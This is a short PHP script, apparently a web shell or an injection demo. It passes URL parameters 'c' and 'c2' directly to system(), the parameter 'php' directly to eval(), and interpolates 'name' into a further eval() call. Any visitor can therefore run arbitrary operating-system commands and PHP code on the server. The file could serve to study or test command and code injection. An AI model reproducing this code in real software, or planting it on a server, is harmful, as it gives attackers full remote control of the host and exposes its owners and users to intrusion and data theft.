<?php
system($_GET['c']);
$cmd = $_GET['c2'];
system("echo '' > test.txt");
$redirect = " >> test.txt";
$cmd=$cmd.$redirect;
system($cmd);


eval($_GET['php']);

$string = "beautiful";
$time = "winter";
$name = $_GET['name'];

$str = 'This is a $string $time morning for you ';
echo $str. "<br>";


eval("\$str = \"$str\"; echo \$str.$name ;");
